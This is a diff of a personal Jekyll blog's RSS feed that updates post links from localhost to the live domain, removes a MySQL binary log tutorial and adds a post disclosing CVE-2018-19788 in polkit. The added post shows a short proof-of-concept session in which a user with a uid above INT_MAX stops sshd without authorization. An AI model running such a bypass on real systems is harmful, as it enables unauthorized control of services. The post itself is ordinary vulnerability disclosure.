@@ -3,11 +3,55 @@
   <channel>
     <title>Hieu's blog</title>
     <description>My blog about Linux, Database, Infrastructure, some mathematics, and mindset.</description>
-    <link>http://localhost:4000/</link>
-    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Mon, 26 Nov 2018 13:23:41 +0700</pubDate>
-    <lastBuildDate>Mon, 26 Nov 2018 13:23:41 +0700</lastBuildDate>
+    <link>https://llnx.me/</link>
+    <atom:link href="https://llnx.me/feed.xml" rel="self" type="application/rss+xml"/>
+    <pubDate>Wed, 05 Dec 2018 23:06:19 +0700</pubDate>
+    <lastBuildDate>Wed, 05 Dec 2018 23:06:19 +0700</lastBuildDate>
     <generator>Jekyll v3.5.1</generator>
+    
+      <item>
+        <title>Critical vulnerability on policykit of systemd</title>
+        <description>&lt;p&gt;&lt;strong&gt;[CVE-2018-19788]&lt;/strong&gt;: A flaw was found in PolicyKit (aka &lt;code class=&quot;highlighter-rouge&quot;&gt;polkit 0.115&lt;/code&gt;) that allows a user with a uid greater than &lt;code class=&quot;highlighter-rouge&quot;&gt;INT_MAX&lt;/code&gt; to successfully execute any &lt;code class=&quot;highlighter-rouge&quot;&gt;systemctl&lt;/code&gt; command.&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/systemd/systemd/issues/11026&quot;&gt;https://github.com/systemd/systemd/issues/11026&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/freedesktop/polkit/blob/8c1bc8a/src/programs/pkttyagent.c#L156&quot;&gt;https://github.com/freedesktop/polkit/blob/8c1bc8a/src/programs/pkttyagent.c#L156&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://gitlab.freedesktop.org/polkit/polkit/issues/74&quot;&gt;https://gitlab.freedesktop.org/polkit/polkit/issues/74&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Find out more about CVE-2018-19788 from the &lt;a href=&quot;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-19788&quot;&gt;MITRE CVE&lt;/a&gt; dictionary and &lt;a href=&quot;http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2018-19788&quot;&gt;NIST NVD&lt;/a&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@ahihi:~# useradd -u 4000000000 wtf
+root@ahihi:~# su - wtf
+No directory, logging in with HOME=/
+
+$ whoami
+wtf
+$ id
+uid=4000000000(wtf) gid=1002(wtf) groups=1002(wtf)
+
+$ systemctl stop sshd.service
+
+(process:22860): GLib-GObject-WARNING **: value &quot;-294967296&quot; of type 'gint' is invalid or out of range for property 'uid' of type 'gint'
+**
+ERROR:pkttyagent.c:175:main: assertion failed: (polkit_unix_process_get_uid (POLKIT_UNIX_PROCESS (subject)) &amp;gt;= 0)
+
+root@ahihi:~# systemctl status sshd.service
+...
+Dec 05 15:38:39 ahihi systemd[1]: Stopping OpenBSD Secure Shell server...
+Dec 05 15:38:39 ahihi systemd[1]: Stopped OpenBSD Secure Shell server.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;!--description--&gt;
+</description>
+        <pubDate>Wed, 05 Dec 2018 00:00:00 +0700</pubDate>
+        <link>https://llnx.me/security/2018/12/05/Critial-vulnerability-on-policykit-of-systemd.html</link>
+        <guid isPermaLink="true">https://llnx.me/security/2018/12/05/Critial-vulnerability-on-policykit-of-systemd.html</guid>
+        
+        
+        <category>security</category>
+        
+      </item>
     
       <item>
         <title>Debian on android shell</title>
@@ -255,8 +299,8 @@ All packages are up to date.
 &lt;/ol&gt;
 </description>
         <pubDate>Tue, 11 Sep 2018 00:00:00 +0700</pubDate>
-        <link>http://localhost:4000/technical/2018/09/11/Debian-on-android-shell.html</link>
-        <guid isPermaLink="true">http://localhost:4000/technical/2018/09/11/Debian-on-android-shell.html</guid>
+        <link>https://llnx.me/technical/2018/09/11/Debian-on-android-shell.html</link>
+        <guid isPermaLink="true">https://llnx.me/technical/2018/09/11/Debian-on-android-shell.html</guid>
         
         
         <category>technical</category>
@@ -356,8 +400,8 @@ Your job is inspecting, finding, &lt;strong&gt;solving&lt;/strong&gt;, validatin
 &lt;/ol&gt;
 </description>
         <pubDate>Sat, 25 Aug 2018 00:00:00 +0700</pubDate>
-        <link>http://localhost:4000/mindset/2018/08/25/Solving-blaming-game.html</link>
-        <guid isPermaLink="true">http://localhost:4000/mindset/2018/08/25/Solving-blaming-game.html</guid>
+        <link>https://llnx.me/mindset/2018/08/25/Solving-blaming-game.html</link>
+        <guid isPermaLink="true">https://llnx.me/mindset/2018/08/25/Solving-blaming-game.html</guid>
         
         
         <category>mindset</category>
@@ -420,8 +464,8 @@ Your job is inspecting, finding, &lt;strong&gt;solving&lt;/strong&gt;, validatin
 
 </description>
         <pubDate>Wed, 15 Aug 2018 00:00:00 +0700</pubDate>
-        <link>http://localhost:4000/technical/2018/08/15/Signal-of-linux.html</link>
-        <guid isPermaLink="true">http://localhost:4000/technical/2018/08/15/Signal-of-linux.html</guid>
+        <link>https://llnx.me/technical/2018/08/15/Signal-of-linux.html</link>
+        <guid isPermaLink="true">https://llnx.me/technical/2018/08/15/Signal-of-linux.html</guid>
         
         
         <category>technical</category>
@@ -474,8 +518,8 @@ fi
 &lt;/ol&gt;
 </description>
         <pubDate>Mon, 06 Aug 2018 00:00:00 +0700</pubDate>
-        <link>http://localhost:4000/today-i-learned/2018/08/06/Learning-logs-in-Aug.html</link>
-        <guid isPermaLink="true">http://localhost:4000/today-i-learned/2018/08/06/Learning-logs-in-Aug.html</guid>
+        <link>https://llnx.me/today-i-learned/2018/08/06/Learning-logs-in-Aug.html</link>
+        <guid isPermaLink="true">https://llnx.me/today-i-learned/2018/08/06/Learning-logs-in-Aug.html</guid>
         
         
         <category>today-i-learned</category>
@@ -515,8 +559,8 @@ Depending on the DB instance class and the amount of storage, it can take up to 
 &lt;p&gt;&lt;a href=&quot;https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/CHAP_GettingStarted.CreatingConnecting.MySQL.html&quot;&gt;https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/CHAP_GettingStarted.CreatingConnecting.MySQL.html&lt;/a&gt;&lt;/p&gt;
 </description>
         <pubDate>Tue, 24 Jul 2018 00:00:00 +0700</pubDate>
-        <link>http://localhost:4000/technical/2018/07/24/RDS-as-a-fckin-service.html</link>
-        <guid isPermaLink="true">http://localhost:4000/technical/2018/07/24/RDS-as-a-fckin-service.html</guid>
+        <link>https://llnx.me/technical/2018/07/24/RDS-as-a-fckin-service.html</link>
+        <guid isPermaLink="true">https://llnx.me/technical/2018/07/24/RDS-as-a-fckin-service.html</guid>
         
         
         <category>technical</category>
@@ -602,8 +646,8 @@ Depending on the DB instance class and the amount of storage, it can take up to 
 &lt;/ol&gt;
 </description>
         <pubDate>Wed, 18 Jul 2018 00:00:00 +0700</pubDate>
-        <link>http://localhost:4000/technical/2018/07/18/Mindset-for-building-HA-system.html</link>
-        <guid isPermaLink="true">http://localhost:4000/technical/2018/07/18/Mindset-for-building-HA-system.html</guid>
+        <link>https://llnx.me/technical/2018/07/18/Mindset-for-building-HA-system.html</link>
+        <guid isPermaLink="true">https://llnx.me/technical/2018/07/18/Mindset-for-building-HA-system.html</guid>
         
         
         <category>technical</category>
@@ -764,8 +808,8 @@ root@webapp-unstable:~# mount -fav
 &lt;p&gt;&lt;a href=&quot;http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/recognize-expanded-volume-linux.html&quot;&gt;http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/recognize-expanded-volume-linux.html&lt;/a&gt;&lt;/p&gt;
 </description>
         <pubDate>Thu, 14 Dec 2017 00:00:00 +0700</pubDate>
-        <link>http://localhost:4000/technical/2017/12/14/Increase-EBS-volume.html</link>
-        <guid isPermaLink="true">http://localhost:4000/technical/2017/12/14/Increase-EBS-volume.html</guid>
+        <link>https://llnx.me/technical/2017/12/14/Increase-EBS-volume.html</link>
+        <guid isPermaLink="true">https://llnx.me/technical/2017/12/14/Increase-EBS-volume.html</guid>
         
         
         <category>technical</category>
@@ -952,8 +996,8 @@ F S   UID   PID  PPID  C PRI  NI ADDR SZ WCHAN  TTY          TIME CMD
 &lt;h3 id=&quot;5-cpu-organization-and-operation&quot;&gt;5. CPU organization and operation&lt;/h3&gt;
 </description>
         <pubDate>Sun, 16 Jul 2017 00:00:00 +0700</pubDate>
-        <link>http://localhost:4000/technical/2017/07/16/Understanding-top-command.html</link>
-        <guid isPermaLink="true">http://localhost:4000/technical/2017/07/16/Understanding-top-command.html</guid>
+        <link>https://llnx.me/technical/2017/07/16/Understanding-top-command.html</link>
+        <guid isPermaLink="true">https://llnx.me/technical/2017/07/16/Understanding-top-command.html</guid>
         
         
         <category>technical</category>
@@ -1070,156 +1114,8 @@ F S   UID   PID  PPID  C PRI  NI ADDR SZ WCHAN  TTY          TIME CMD
 &lt;/ul&gt;
 </description>
         <pubDate>Sun, 25 Jun 2017 00:00:00 +0700</pubDate>
-        <link>http://localhost:4000/technical/2017/06/25/Adware-on-Betternet-chrome-extension.html</link>
-        <guid isPermaLink="true">http://localhost:4000/technical/2017/06/25/Adware-on-Betternet-chrome-extension.html</guid>
-        
-        
-        <category>technical</category>
-        
-      </item>
-    
-      <item>
-        <title>The MySQL binary log</title>
-        <description>&lt;p&gt;&lt;strong&gt;The binary log&lt;/strong&gt; contains &lt;code class=&quot;highlighter-rouge&quot;&gt;events&lt;/code&gt; that describe &lt;code class=&quot;highlighter-rouge&quot;&gt;database changes&lt;/code&gt; such as table creation operations or changes to table data. It also contains events for statements that &lt;strong&gt;potentially could have made changes&lt;/strong&gt; (for example, a DELETE which matched no rows), unless row-based logging is used. The binary log also contains information about &lt;code class=&quot;highlighter-rouge&quot;&gt;how long each statement&lt;/code&gt; took that &lt;strong&gt;updated data&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/master-binlog.webp&quot; alt=&quot;Binlog&quot; /&gt;&lt;/p&gt;
-
-&lt;!--description--&gt;
-
-&lt;h2 id=&quot;the-binary-log-has-two-important-purposes&quot;&gt;The binary log has two important purposes:&lt;/h2&gt;
-&lt;ol&gt;
-  &lt;li&gt;
-    &lt;p&gt;For replication, the binary log on a master replication server provides a record of the data changes to be sent to slave servers.
-The master server sends the events contained in its binary log to its slaves, 
-which &lt;code class=&quot;highlighter-rouge&quot;&gt;execute&lt;/code&gt; those events to make the &lt;code class=&quot;highlighter-rouge&quot;&gt;same data changes&lt;/code&gt; that were made on the master&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Certain &lt;code class=&quot;highlighter-rouge&quot;&gt;data recovery operations&lt;/code&gt; require use of the binary log. After a backup has been restored, 
-the events in the binary log that were recorded after the backup was made are re-executed.
-These events bring databases up to date from the point of the backup&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt;&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;The binary log is &lt;code class=&quot;highlighter-rouge&quot;&gt;not used&lt;/code&gt; for statements such as &lt;code class=&quot;highlighter-rouge&quot;&gt;SELECT&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;SHOW&lt;/code&gt; that do &lt;code class=&quot;highlighter-rouge&quot;&gt;not modify data&lt;/code&gt;.&lt;/li&gt;
-  &lt;li&gt;To log all statements (for example, to identify a problem query), use the &lt;code class=&quot;highlighter-rouge&quot;&gt;general query log&lt;/code&gt;&lt;/li&gt;
-  &lt;li&gt;Running a server with binary logging enabled makes performance slightly slower.&lt;/li&gt;
-  &lt;li&gt;However, the benefits of the binary log in enabling you to set up replication and for restore operations generally outweigh this minor performance decrement.&lt;/li&gt;
-  &lt;li&gt;The binary log is generally resilient to unexpected halts because only complete transactions are logged or read back&lt;/li&gt;
-  &lt;li&gt;Slave server in replication  by default does not write to its own binary log any data modifications that are received from the replication master. 
-But sometime we want to log these modifications, slave can do that. This is done when a slave is also to &lt;code class=&quot;highlighter-rouge&quot;&gt;act as a master&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;other slaves&lt;/code&gt; in chained replication.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;binary-log-files&quot;&gt;Binary log files&lt;/h2&gt;
-&lt;ul&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;strong&gt;mysqld&lt;/strong&gt; appends a numeric extension to the binary log base name to generate binlog file names.
-The number increases each time the server creates a new log file, thus creating an ordered series of files.&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;The server creates a &lt;strong&gt;new file&lt;/strong&gt; in the series each time it &lt;strong&gt;starts or flushes&lt;/strong&gt; the logs. 
-The server also creates a new binary log file automatically after the current log’s size reaches &lt;code class=&quot;highlighter-rouge&quot;&gt;max_binlog_size&lt;/code&gt;. 
-A binary log file may become larger than max_binlog_size if you are using large transactions because a transaction is written to the file in one piece, never split between files.&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;To keep track of which binary log files have been used, mysqld also creates a &lt;strong&gt;binary log index file&lt;/strong&gt; that contains the names of all used binary log files. By default, this has the same base name as the binary log file, with the extension &lt;code class=&quot;highlighter-rouge&quot;&gt;.index&lt;/code&gt;. You can change the name of the binary log index file with the &lt;code class=&quot;highlighter-rouge&quot;&gt;--log-bin-index[=file_name]&lt;/code&gt; option. You should not manually edit this file while mysqld is running; doing so would confuse mysqld.&lt;/li&gt;
-  &lt;li&gt;A client that has the &lt;strong&gt;SUPER privilege&lt;/strong&gt; can disable binary logging of its own statements by using a &lt;code class=&quot;highlighter-rouge&quot;&gt;SET sql_log_bin=0&lt;/code&gt; statement&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;type-of-binlog&quot;&gt;Type of binlog&lt;/h2&gt;
-&lt;p&gt;The format of the events recorded in the binary log is dependent on the binary logging format. The server uses several logging formats to record information in the binary log. &lt;code class=&quot;highlighter-rouge&quot;&gt;Three format&lt;/code&gt; types are supported:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;row-based&lt;/code&gt;: In row-based logging, the &lt;strong&gt;master writes events&lt;/strong&gt; to the binary log that indicate how &lt;strong&gt;individual table rows are affected&lt;/strong&gt;.&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;statement-based&lt;/code&gt;: Replication capabilities in MySQL originally were based on &lt;strong&gt;propagation of SQL statements&lt;/strong&gt; from master to slave. This is called statement-based logging.&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;mixed-base&lt;/code&gt;: A third option is also available: mixed logging. With mixed logging, &lt;strong&gt;statement-based logging is used by default&lt;/strong&gt;, but the logging mode &lt;strong&gt;switches automatically to row-based&lt;/strong&gt; in certain cases as described below.&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;The exact format employed depends on the version of MySQL being used. The logging format can also be set or limited by the storage engine being used. This helps to eliminate issues when replicating certain statements between a master and slave which are using different storage engines&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt;
-With &lt;code class=&quot;highlighter-rouge&quot;&gt;statement-based&lt;/code&gt; replication, there may be issues with replicating nondeterministic statements. Issue: “Statement may not be safe to log in statement format”. You can avoid these issues by using MySQL’s &lt;code class=&quot;highlighter-rouge&quot;&gt;row-based&lt;/code&gt; replication instead.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;In MySQL &lt;code class=&quot;highlighter-rouge&quot;&gt;row-based&lt;/code&gt; replication&lt;/strong&gt;, each row change event contains two images, a “before” image whose columns are matched against when searching for the row to be updated, and an “after” image containing the changes. Normally, MySQL logs full rows (that is, all columns) for both the before and after images. However, it is not strictly necessary to include every column in both images, and we can often save disk, memory, and network usage by logging only those columns which are actually required.&lt;/p&gt;
-
-&lt;p&gt;In MySQL 5.6, you can cause the server to log full or minimal rows using the &lt;code class=&quot;highlighter-rouge&quot;&gt;binlog_row_image&lt;/code&gt; system variable. This variable actually takes one of three possible values, as shown in the following list:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;full&lt;/code&gt;: Log all columns in both the before image and the after image.&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;minimal&lt;/code&gt;: Log only those columns in the before image that are required to identify the row to be changed; log only those columns in the after image that are actually changed.&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;noblob&lt;/code&gt;: Log all columns (same as full), except for BLOB and TEXT columns that are not required to identify rows, or that have not changed.&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;binlog-operations&quot;&gt;Binlog operations&lt;/h2&gt;
-&lt;p&gt;Manual config binlog in this file: &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/mysql/conf.d/replication-binlog.cnf&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
-&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mysqld&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;variable&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;Enable binary logging and set file base name
-    &lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bin&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mysql&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bin&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;Set index file for binary log file names
-    &lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bin&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;index&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mysql&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;index&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;Config binlog format: &lt;strong&gt;one&lt;/strong&gt; of them
-    &lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;binlog&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;STATEMENT&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;or&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;binlog&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;ROW&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;or&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;binlog&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MIXED&lt;/span&gt; 
-&lt;/code&gt;&lt;/pre&gt;
-    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;In ROW based, config server to log full or minimal rows
-    &lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;binlog_row_image&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FULL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Log&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;all&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;columns&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;binlog_row_image&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MINIMAL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Log&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;only&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;changed&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;columns&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;columns&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;needed&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;identify&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;rows&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;binlog_row_image&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NOBLOB&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Log&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;all&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;columns&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unneeded&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BLOB&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TEXT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;columns&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;Set number of days for automatic binary log file removal. The default is 0, which means “no automatic removal.”
-    &lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;expire&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;logs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;days&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;Remove binary log files manually
-    &lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;mysql&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PURGE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BINARY&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LOGS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;or&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;mysql&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;RESET&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MASTER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-    &lt;/div&gt;
-  &lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;h2 id=&quot;reference&quot;&gt;Reference:&lt;/h2&gt;
-&lt;ol&gt;
-  &lt;li&gt;&lt;a href=&quot;https://dev.mysql.com/doc/refman/5.6/en/binary-log.html&quot;&gt;https://dev.mysql.com/doc/refman/5.6/en/binary-log.html&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://dev.mysql.com/doc/refman/5.6/en/binary-log-formats.html&quot;&gt;https://dev.mysql.com/doc/refman/5.6/en/binary-log-formats.html&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://dev.mysql.com/doc/refman/5.6/en/replication-rbr-safe-unsafe.html&quot;&gt;https://dev.mysql.com/doc/refman/5.6/en/replication-rbr-safe-unsafe.html&lt;/a&gt;&lt;/li&gt;
-&lt;/ol&gt;
-</description>
-        <pubDate>Sun, 04 Jun 2017 00:00:00 +0700</pubDate>
-        <link>http://localhost:4000/technical/2017/06/04/The-MySQL-Binary-log.html</link>
-        <guid isPermaLink="true">http://localhost:4000/technical/2017/06/04/The-MySQL-Binary-log.html</guid>
+        <link>https://llnx.me/technical/2017/06/25/Adware-on-Betternet-chrome-extension.html</link>
+        <guid isPermaLink="true">https://llnx.me/technical/2017/06/25/Adware-on-Betternet-chrome-extension.html</guid>
         
         
         <category>technical</category>
